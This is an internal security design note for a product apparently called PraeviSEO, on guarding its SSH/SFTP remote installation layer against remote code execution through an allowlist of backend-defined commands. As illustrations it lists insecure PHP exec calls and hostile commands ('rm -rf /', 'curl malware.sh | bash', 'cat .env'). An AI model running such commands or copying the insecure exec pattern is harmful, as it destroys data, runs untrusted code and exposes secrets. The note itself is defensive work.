# Remote Installation Security

PraeviSEO can now open SSH / SFTP sessions against real client servers. That makes
the remote installation layer one of the most sensitive parts of the product.

## Primary risk: RCE

RCE means `Remote Code Execution`.

If a user-controlled value can reach shell execution directly, an attacker could
make PraeviSEO run arbitrary commands on a client server.

Dangerous examples:

```php
$ssh->exec($request->command);
exec($userInput);
```

If that happened, an attacker could try commands such as:

- `rm -rf /`
- `curl malware.sh | bash`
- `wget payload`
- `cat .env`

## Security boundary

`App\RemoteInstallation\RemoteCommand` is the central security boundary.

Rules:

- no controller may accept a shell command from the frontend
- no service may concatenate a free-form shell command from request payload
- connectors may execute only a `RemoteCommand`
- every allowed command must be declared in code, reviewed, audited and tested

## What stays allowed

Only backend-defined commands such as:

- detect PHP version
- detect Composer
- verify write access
- install the Laravel bridge
- install the Symfony bridge
- run the framework connect command
- clear framework cache

## What is forbidden

- arbitrary shell input from the client
- interactive shell access
- dynamic `exec()` from request data
- logging secrets or raw SSH payloads
- returning credentials to the frontend

## Supporting controls

- encrypted credentials at rest via Laravel encrypted casts
- strict host validation
- queue isolation for remote installation jobs
- translated client-safe errors instead of raw SSH/PHP exceptions
- frontend polling of safe progress/status only
